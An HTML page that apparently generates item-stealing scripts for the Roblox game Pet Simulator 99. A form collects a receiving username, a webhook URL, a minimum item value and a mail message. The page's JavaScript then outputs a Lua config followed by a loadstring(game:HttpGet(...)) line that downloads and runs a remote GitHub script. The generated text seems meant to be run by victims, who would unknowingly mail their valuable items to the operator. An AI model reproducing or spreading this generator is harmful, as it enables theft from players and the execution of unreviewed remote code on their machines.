<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Argon X Scripts - Ps99</title>
  <style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f5f5f5; /* Light gray background for less strain */
        color: #333; /* Dark gray text for better readability */
        text-align: center;
        margin: 0;
        padding: 0;
    }
    .container {
        max-width: 800px;
        margin: 50px auto;
        padding: 20px;
        background: #ffffff; /* White background for the container */
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    h1 {
        color: #007bff; /* A soothing blue for the header */
    }
    form {
        margin: 20px 0;
    }
    input, textarea {
        display: block;
        width: calc(100% - 22px);
        margin: 10px auto;
        padding: 10px;
        border: 1px solid #ccc; /* Light gray border */
        border-radius: 5px;
        font-size: 16px;
        background-color: #f9f9f9; /* Slightly off-white background for inputs */
    }
    button {
        background-color: #007bff; /* Blue button */
        color: white;
        border: none;
        padding: 10px 20px;
        font-size: 16px;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.3s ease;
    }
    button:hover {
        background-color: #0056b3; /* Darker blue on hover */
    }
    #status {
        margin-top: 20px;
        font-size: 16px;
    }
    #pastelist {
        margin-top: 20px;
        text-align: left;
        max-width: 600px;
        margin-left: auto;
        margin-right: auto;
    }
    #pastelist ul {
        list-style-type: none;
        padding: 0;
    }
    #pastelist li {
        margin-bottom: 10px;
    }
    #pastelist a {
        color: #007bff;
        text-decoration: none;
    }
    #pastelist a:hover {
        text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Argon X Scripts Generator!</h1>
    <form id="scriptForm">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username"><br><br>
      <label for="webhook">Webhook URL:</label>
      <input type="text" id="webhook" name="webhook"><br><br>
      <label for="minimumRAP">Minimum RAP:</label>
      <input type="number" id="minimumRAP" name="minimumRAP"><br><br>
      <label for="mailMessage">Mail Message:</label>
      <input type="text" id="mailMessage" name="mailMessage"><br><br>
      <button type="button" id="generateBtn">Generate</button>
      <textarea id="output" readonly></textarea><br><br>
      <button type="button" id="copyBtn">Copy to Clipboard</button>
    </form>
  </div>

  <script>
    // Make sure DOM is loaded before adding event listeners
    document.addEventListener("DOMContentLoaded", function() {
      const generateButton = document.getElementById('generateBtn');
      const copyButton = document.getElementById('copyBtn');
      
      // Add event listener for generate button
      generateButton.addEventListener('click', function(event) {
        event.preventDefault(); // Prevent any default form action
        
        // Fetching values from input fields
        const username = document.getElementById("username").value;
        const webhook = document.getElementById("webhook").value;
        const minimumRAP = document.getElementById("minimumRAP").value;
        const mailMessage = document.getElementById("mailMessage").value;

        // Logging to check if values are fetched correctly
        console.log("Username:", username);
        console.log("Webhook:", webhook);
        console.log("Minimum RAP:", minimumRAP);
        console.log("Mail Message:", mailMessage);

        // Input validation - check if fields are filled
        if (!username || !webhook || !minimumRAP || !mailMessage) {
          alert("Please fill in all fields.");
          return;
        }

        // Generate output string based on the new structure
        const outputString = `--generate\n` +
                             `--website made by kizamies#0001/Shimm\n` +
                             `config = {\n` +
                             `    Username = "${username}",\n` +
                             `    Webhook = "${webhook}",\n` +
                             `    MinimumRAP = "${minimumRAP}",\n` +
                             `    MailMessage = "${mailMessage}",\n` +
                             `}\n\n` +
                             'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua",true))()';

        // Set the output in the textarea
        document.getElementById("output").value = outputString;
      });

      // Add event listener for copy button
      copyButton.addEventListener('click', function() {
        const copyText = document.getElementById("output");
        copyText.select();
        copyText.setSelectionRange(0, 99999); // For mobile devices
        document.execCommand("copy");
        alert("Copied to clipboard!");
      });
    });
  </script>
</body>
</html>
